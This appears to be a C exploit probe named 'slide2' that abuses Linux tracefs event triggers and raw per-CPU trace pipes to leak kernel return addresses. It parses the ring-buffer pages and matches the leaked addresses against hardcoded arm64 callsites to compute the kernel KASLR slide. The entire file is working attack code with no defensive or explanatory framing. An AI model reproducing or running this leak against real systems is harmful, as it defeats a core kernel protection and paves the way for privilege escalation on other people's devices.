/* slide2 - blocking-read variant of the slide probe (poll() no longer wakes up) */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/timerfd.h>
#include <time.h>

#define T "/sys/kernel/tracing"
#define PAGE 4096
#define KVA 0xffffff8000000000ULL
#define KEND 0xfffffffec0000000ULL

static char *g_buf;
static size_t g_cap = 64u << 20, g_used;
static pthread_mutex_t g_mu = PTHREAD_MUTEX_INITIALIZER;
static int g_fds[16], g_nfds;

static void *reader(void *arg)
{
    int fd = (int)(intptr_t)arg;
    char tmp[65536];
    for (;;) {
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n <= 0) break;
        pthread_mutex_lock(&g_mu);
        if (g_used + (size_t)n < g_cap) { memcpy(g_buf + g_used, tmp, (size_t)n); g_used += (size_t)n; }
        pthread_mutex_unlock(&g_mu);
    }
    return NULL;
}

static int wf(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}
static int wfa(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY | O_APPEND); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}

static const uint64_t callsites[] = {
    0xffffffc0801d2f04ULL, 0xffffffc08027cf44ULL, 0xffffffc08026b600ULL,
    0xffffffc080230900ULL, 0xffffffc0801c6a00ULL,
};

int main(void)
{
    pthread_t th[16];
    int i, tfds[256], ntf = 0;
    struct itimerspec its;

    g_buf = malloc(g_cap);
    if (!g_buf) return 1;

    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:sched:sched_blocked_reason\n");
    wf(T "/buffer_size_kb", "16384\n");
    wf(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
    wf(T "/tracing_on", "1\n");
    { size_t n = 8u << 20; char *m = malloc(n); if (m) { memset(m, 0x5a, n); free(m); } }  /* fire rss_stat */

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        g_fds[g_nfds] = open(p, O_RDONLY);      /* blocking on purpose */
        if (g_fds[g_nfds] < 0) break;
        pthread_create(&th[g_nfds], NULL, reader, (void *)(intptr_t)g_fds[g_nfds]);
        g_nfds++;
    }
    printf("blocking raw pipes: %d\n", g_nfds);

    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 800000L;
    for (i = 0; i < 256; i++) {
        int fd = timerfd_create(CLOCK_MONOTONIC, 0);
        if (fd < 0) break;
        if (timerfd_settime(fd, 0, &its, NULL) != 0) { close(fd); break; }
        tfds[ntf++] = fd;
    }
    usleep(400000);
    for (i = 0; i < ntf; i++) { struct itimerspec again = its; timerfd_settime(tfds[i], 0, &again, NULL); }
    usleep(400000);
    wf(T "/tracing_on", "0\n");
    for (i = 0; i < g_nfds; i++) { close(g_fds[i]); pthread_join(th[i], NULL); }
    for (i = 0; i < ntf; i++) close(tfds[i]);
    printf("captured %zu bytes\n", g_used);

    /* page-walk: 16-byte page header, len = type_len*4 + 4, caller at payload+16 */
    {
        size_t page, callers = 0, recs = 0;
        uint64_t vals[256];
        int nv = 0, a, b;
        for (page = 0; page + 16 < g_used; page += PAGE) {
            size_t end = page + PAGE, p = page + 16;
            if (end > g_used) end = g_used;
            while (p + 4 <= end) {
                uint32_t hdr, tlen, len;
                memcpy(&hdr, g_buf + p, 4);
                tlen = hdr & 0x1f;
                if (tlen == 0) { uint32_t pl; memcpy(&pl, g_buf + p + 4, 4); if (!pl) break; p += pl + 4; continue; }
                if (tlen == 1 || tlen == 2) { p += 12; continue; }
                len = tlen * 4 + 4;
                if (p + len > end) break;
                recs++;
                if (len == 36 && nv < 256) {
                    uint64_t c;
                    memcpy(&c, g_buf + p + 4 + 16, 8);
                    if (c >= KVA && c < KEND) { vals[nv++] = c; callers++; }
                }
                p += len;
            }
        }
        printf("records=%zu callers=%zu\n", recs, callers);
        {
            uint64_t votes[16]; int cnt[16], nvo = 0;
            for (a = 0; a < nv; a++) {
                for (b = 0; b < (int)(sizeof(callsites)/sizeof(callsites[0])); b++) {
                    uint64_t s;
                    int k, f = -1;
                    if (vals[a] < callsites[b]) continue;
                    s = vals[a] - callsites[b];
                    if ((s & 0x1fffffULL) != 0 || s == 0 || s >= 0x10000000000ULL) continue;
                    for (k = 0; k < nvo; k++) if (votes[k] == s) { f = k; break; }
                    if (f >= 0) cnt[f]++;
                    else if (nvo < 16) { votes[nvo] = s; cnt[nvo] = 1; nvo++; }
                }
            }
            for (a = 0; a < nvo; a++)
                printf("  slide candidate 0x%llx votes=%d\n", (unsigned long long)votes[a], cnt[a]);
        }
    }
    return 0;
}
